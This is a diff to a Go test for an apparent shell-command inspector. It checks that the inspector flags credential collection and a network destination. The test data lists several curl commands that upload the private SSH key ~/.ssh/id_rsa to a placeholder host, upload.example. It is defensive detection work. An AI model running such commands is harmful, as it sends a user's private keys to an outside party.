@@ -445,12 +445,15 @@ func TestInspectInlineShellSensitiveCurlFormUploadSource(t *testing.T) {
 		"curl -Ffile=@~/.ssh/id_rsa https://upload.example/form",
 		"curl --form file=@~/.ssh/id_rsa https://upload.example/form",
 		"curl --form=file=@~/.ssh/id_rsa https://upload.example/form",
-		"curl -F file=<~/.ssh/id_rsa https://upload.example/form",
+		"curl -F 'file=<~/.ssh/id_rsa' https://upload.example/form",
 	}
 	for _, command := range tests {
 		rep, err := inspectInlineShellForTest(command, artifact.Options{})
 		if err != nil {
 			t.Fatal(err)
+		}
+		if !hasCapability(rep, "macos.credential-material-collection") {
+			t.Fatalf("form source was not modeled for %q: operations=%#v coverage=%#v", command, rep.Operations, rep.Coverage)
 		}
 		assertCapability(t, rep, "macos.credential-material-collection")
 		assertNetworkDestination(t, rep, "https://upload.example/form")
